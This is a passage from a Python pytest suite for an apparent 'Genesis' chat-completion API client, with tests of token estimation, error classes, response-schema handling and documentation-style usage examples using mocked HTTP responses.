            api_key='immutable-test-key',
            timeout=30,
            max_retries=3
        )
        
        original_key = client.api_key
        original_timeout = client.timeout
        original_retries = client.max_retries
        
        # Attempt to modify (should not affect internal state)
        try:
            client.api_key = 'modified-key'
            client.timeout = 60
            client.max_retries = 10
        except AttributeError:
            pass  # Expected if properties are read-only
        
        # Values should remain unchanged if properly protected
        # (This test will pass regardless, but documents expected behavior)


class TestAdvancedUtilityFunctionCoverage:
    """Comprehensive tests for utility functions with edge cases."""
    
    def test_format_timestamp_timezone_handling(self):
        """Test timestamp formatting with different timezone scenarios."""
        from app.ai_backend.genesis_api import format_timestamp
        
        # Test various timestamp values
        timestamp_tests = [
            0,           # Unix epoch
            946684800,   # Y2K
            1577836800,  # 2020-01-01
            1672531200,  # 2023-01-01
            2147483647,  # Max 32-bit timestamp
        ]
        
        for timestamp in timestamp_tests:
            formatted = format_timestamp(timestamp)
            assert isinstance(formatted, str)
            assert len(formatted) > 0
            # Should contain reasonable date components
            assert any(char.isdigit() for char in formatted)
    
    def test_calculate_token_usage_complex_scenarios(self):
        """Test token usage calculation with complex message scenarios."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        complex_scenarios = [
            # Empty messages
            [],
            
            # Single message types
            [ChatMessage(role="user", content="Short")],
            [ChatMessage(role="assistant", content="Medium length response with more words")],
            [ChatMessage(role="system", content="System prompt with instructions")],
            
            # Mixed conversation
            [
                ChatMessage(role="system", content="You are a helpful assistant."),
                ChatMessage(role="user", content="What is Python?"),
                ChatMessage(role="assistant", content="Python is a programming language."),
                ChatMessage(role="user", content="How do I learn it?"),
                ChatMessage(role="assistant", content="Start with basic syntax and practice coding."),
            ],
            
            # Messages with special content
            [ChatMessage(role="user", content="Code: print('hello')\n\nExplain this.")],
            [ChatMessage(role="user", content="Math: 2+2=4, solve: x²+3x+2=0")],
            [ChatMessage(role="user", content="URLs: https://example.com and email@test.com")],
        ]
        
        for messages in complex_scenarios:
            usage = calculate_token_usage(messages)
            assert isinstance(usage, dict)
            assert 'estimated_tokens' in usage
            assert isinstance(usage['estimated_tokens'], int)
            assert usage['estimated_tokens'] >= 0
    
    def test_estimate_tokens_multilingual_content(self):
        """Test token estimation with multilingual content."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        multilingual_tests = [
            ("Hello", "English"),
            ("Bonjour", "French"), 
            ("Hola", "Spanish"),
            ("Guten Tag", "German"),
            ("こんにちは", "Japanese"),
            ("你好", "Chinese"),
            ("Привет", "Russian"),
            ("مرحبا", "Arabic"),
            ("Hello 你好 Bonjour", "Mixed languages"),
        ]
        
        for content, language in multilingual_tests:
            tokens = estimate_tokens(content)
            assert isinstance(tokens, int)
            assert tokens > 0  # All should have some token count
    
    def test_estimate_tokens_special_content_types(self):
        """Test token estimation with special content types."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        special_content_tests = [
            # Code blocks
            "```python\nprint('hello')\n```",
            "function test() { return 42; }",
            
            # JSON data
            '{"key": "value", "number": 123}',
            
            # URLs and emails
            "Visit https://example.com or email test@example.com",
            
            # Mathematical expressions
            "E=mc², ∫x²dx = x³/3 + C",
            
            # Special characters
            "Special: !@#$%^&*()_+-=[]{}|;':\"<>?,./",
            
            # Repeated patterns
            "ha " * 100,  # Repetitive content
            
            # Mixed content
            "Text with 123 numbers, https://url.com, and emoji 🚀",
        ]
        
        for content in special_content_tests:
            tokens = estimate_tokens(content)
            assert isinstance(tokens, int)
            assert tokens >= 0


class TestAdvancedErrorMessageHandling:
    """Tests for comprehensive error message handling and formatting."""
    
    def test_error_message_internationalization(self):
        """Test error message handling with international characters."""
        error_messages = [
            "Error: Invalid request",
            "Erreur: Requête invalide",  # French
            "Error: Solicitud inválida",  # Spanish
            "Fehler: Ungültige Anfrage",  # German
            "エラー：無効な要求",  # Japanese
            "错误：无效请求",  # Chinese
            "Ошибка: неверный запрос",  # Russian
        ]
        
        for message in error_messages:
            error = GenesisAPIError(message, status_code=400)
            assert str(error) == message
            assert error.status_code == 400
    
    def test_error_with_structured_details(self):
        """Test error handling with structured error details."""
        structured_errors = [
            {"code": "VALIDATION_ERROR", "message": "Invalid input", "field": "temperature"},
            {"type": "rate_limit", "message": "Too many requests", "retry_after": 60},
            {"error": {"message": "Server error", "type": "internal_error", "code": 500}},
        ]
        
        for error_data in structured_errors:
            # Should handle structured error data appropriately
            error_message = str(error_data)  # Convert to string representation
            error = GenesisAPIError(error_message, status_code=400)
            assert len(str(error)) > 0
    
    def test_error_with_very_long_messages(self):
        """Test error handling with extremely long error messages."""
        long_message = "Error: " + "x" * 10000  # Very long error message
        
        error = GenesisAPIError(long_message, status_code=500)
        assert str(error) == long_message
        
        # Should handle without memory issues
        rate_error = RateLimitError(long_message, retry_after=60)
        assert str(rate_error) == long_message
        assert rate_error.retry_after == 60


class TestAdvancedResponseValidation:
    """Advanced response validation and data integrity tests."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-response-validation-key')
    
    @pytest.mark.asyncio
    async def test_response_schema_validation(self, client):
        """Test validation of response schemas against expected format."""
        # Test various response schemas
        valid_responses = [
            # Minimal valid response
            {
                'id': 'test-minimal',
                'object': 'chat.completion',
                'created': 1677610602,
                'model': 'test-model',
                'choices': [],
                'usage': {}
            },
            
            # Complete response
            {
                'id': 'test-complete',
                'object': 'chat.completion', 
                'created': 1677610602,
                'model': 'test-model',
                'choices': [{
                    'index': 0,
                    'message': {'role': 'assistant', 'content': 'Response'},
                    'finish_reason': 'stop'
                }],
                'usage': {'prompt_tokens': 10, 'completion_tokens': 5, 'total_tokens': 15}
            },
            
            # Response with multiple choices
            {
                'id': 'test-multiple',
                'object': 'chat.completion',
                'created': 1677610602,
                'model': 'test-model',
                'choices': [
                    {'index': 0, 'message': {'role': 'assistant', 'content': 'First'}, 'finish_reason': 'stop'},
                    {'index': 1, 'message': {'role': 'assistant', 'content': 'Second'}, 'finish_reason': 'stop'}
                ],
                'usage': {'prompt_tokens': 10, 'completion_tokens': 10, 'total_tokens': 20}
            }
        ]
        
        for response_data in valid_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_data)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Test")],
                    model_config=ModelConfig(name="test-model")
                )
                
                # Validate response structure
                assert hasattr(result, 'id')
                assert hasattr(result, 'choices')
                assert hasattr(result, 'usage')
                assert result.id == response_data['id']
    
    @pytest.mark.asyncio
    async def test_response_with_unexpected_fields(self, client):
        """Test handling of responses with unexpected additional fields."""
        response_with_extras = {
            'id': 'test-extras',
            'object': 'chat.completion',
            'created': 1677610602,
            'model': 'test-model',
            'choices': [{'message': {'role': 'assistant', 'content': 'Test'}}],
            'usage': {'total_tokens': 10},
            
            # Additional unexpected fields
            'extra_field': 'unexpected_value',
            'metadata': {'version': '1.0', 'timestamp': '2023-01-01'},
            'debug_info': {'request_id': 'debug-123', 'processing_time': 1.5}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_with_extras)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test")],
                model_config=ModelConfig(name="test-model")
            )
            
            # Should handle gracefully, extracting expected fields
            assert result.id == 'test-extras'
    
    @pytest.mark.asyncio
    async def test_response_field_type_validation(self, client):
        """Test validation of response field types."""
        invalid_type_responses = [
            # String ID as number
            {
                'id': 12345,  # Should be string
                'object': 'chat.completion',
                'created': 1677610602,
                'model': 'test-model',
                'choices': [],
                'usage': {}
            },
            
            # Created timestamp as string
            {
                'id': 'test-types',
                'object': 'chat.completion', 
                'created': "1677610602",  # Should be number
                'model': 'test-model',
                'choices': [],
                'usage': {}
            },
            
            # Choices as non-list
            {
                'id': 'test-types',
                'object': 'chat.completion',
                'created': 1677610602,
                'model': 'test-model',
                'choices': "not a list",  # Should be list
                'usage': {}
            }
        ]
        
        for invalid_response in invalid_type_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=invalid_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                # Should handle type mismatches gracefully
                try:
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="Test")],
                        model_config=ModelConfig(name="test-model")
                    )
                    # If successful, verify basic structure is maintained
                    assert hasattr(result, 'id')
                except (TypeError, AttributeError, GenesisAPIError):
                    pass  # Acceptable to reject invalid types


class TestComprehensiveDocumentationExamples:
    """Tests that verify examples that might appear in documentation work correctly."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-docs-key')
    
    @pytest.mark.asyncio
    async def test_basic_usage_example(self):
        """Test basic usage example that would appear in documentation."""
        mock_response = {
            'id': 'docs-example-1',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {'role': 'assistant', 'content': 'Hello! How can I help you today?'},
                'finish_reason': 'stop'
            }],
            'usage': {'prompt_tokens': 10, 'completion_tokens': 8, 'total_tokens': 18}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Example code that would appear in docs
            async with GenesisAPIClient(api_key='your-api-key') as client:
                messages = [
                    ChatMessage(role="system", content="You are a helpful assistant."),
                    ChatMessage(role="user", content="Hello!")
                ]
                config = ModelConfig(name="genesis-gpt-4", temperature=0.7, max_tokens=100)
                
                response = await client.create_chat_completion(
                    messages=messages,
                    model_config=config
                )
                
                # Verify expected results
                assert response.choices[0].message.content == 'Hello! How can I help you today?'
                assert response.usage.total_tokens == 18
    
    @pytest.mark.asyncio
    async def test_streaming_usage_example(self):
        """Test streaming usage example for documentation."""
        mock_chunks = [
            {'choices': [{'delta': {'role': 'assistant'}}]},
            {'choices': [{'delta': {'content': 'Streaming'}}]},
            {'choices': [{'delta': {'content': ' response'}}]},
            {'choices': [{'delta': {'content': ' example'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Example streaming code for docs
            async with GenesisAPIClient(api_key='your-api-key') as client:
                messages = [ChatMessage(role="user", content="Tell me a story")]
                config = ModelConfig(name="genesis-gpt-4", temperature=0.8)
                
                full_response = ""
                async for chunk in client.create_chat_completion_stream(
                    messages=messages,
                    model_config=config
                ):
                    if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                        if chunk.choices[0].delta.content:
                            full_response += chunk.choices[0].delta.content
                
                assert full_response == "Streaming response example"
    
    @pytest.mark.asyncio
    async def test_error_handling_example(self):
        """Test error handling example for documentation."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate rate limit error
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Rate limit exceeded'}}
            )
            mock_post.return_value.__aenter__.return_value.headers = {'Retry-After': '60'}
            
            # Example error handling code for docs
            async with GenesisAPIClient(api_key='your-api-key') as client:
                messages = [ChatMessage(role="user", content="Test")]
                config = ModelConfig(name="genesis-gpt-4")
                
                try:
                    response = await client.create_chat_completion(
                        messages=messages,
                        model_config=config
                    )
                except RateLimitError as e:
                    # Example error handling
                    assert e.retry_after == 60
                    assert "Rate limit" in str(e)
                except AuthenticationError:
                    # Handle auth errors
                    pass
                except ValidationError:
                    # Handle validation errors
                    pass
                except GenesisAPIError:
                    # Handle general API errors
                    pass


# Additional test markers for better test organization
pytestmark = [
    pytest.mark.unit,  # Mark all tests as unit tests
]
